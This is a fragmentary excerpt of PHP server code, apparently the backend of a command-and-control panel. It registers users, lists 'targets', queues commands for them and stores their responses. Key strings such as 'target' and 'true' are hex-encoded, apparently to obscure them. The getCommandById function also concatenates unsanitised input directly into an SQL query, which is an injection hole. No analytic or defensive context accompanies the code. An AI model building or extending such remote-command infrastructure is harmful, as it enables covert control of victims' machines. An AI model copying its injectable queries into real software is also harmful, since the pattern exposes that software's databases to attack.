...
function getCommandById($id, $uid) {
    ...
    echo $row['cmd'];
	if($row['to'] == $uid) {
		mysql_query("UPDATE `commands` SET `read` = '74 72 75 65' WHERE `ID` = '" . $id . "'") or die("!error updating command, mysql said: " . mysql_error());
	}
}
...
if($_POST) {
    ...
    switch($_POST['action']) {        
        case "register":
            ...
            break;
        case "getTargets":
            $sql_reply = mysql_query("SELECT * FROM `users` WHERE `type` = '74 61 72 67 65 74'") or die("!failed to get targets, mysql said: " . mysql_error());
            if(mysql_num_rows($sql_reply) == 0) {
                die("%no targets...\n");
            }
        ...
        case "saveCommand":
            ...
            getCommandById(mysql_insert_id(), $_POST['UID']);
            break;
        case "saveResponse":
        ...
        case "listCommands":
            ...
            while($row = mysql_fetch_array($sql_reply)) {
				if($row['read'] == "74 72 75 65") continue;
                echo $row['ID'];
                echo "\r";
                echo $row['from'];
                echo " C ";
            ...
            break;
        case "getCommand":
            getCommandById($_POST['ID'], $_POST['UID']);
            break;
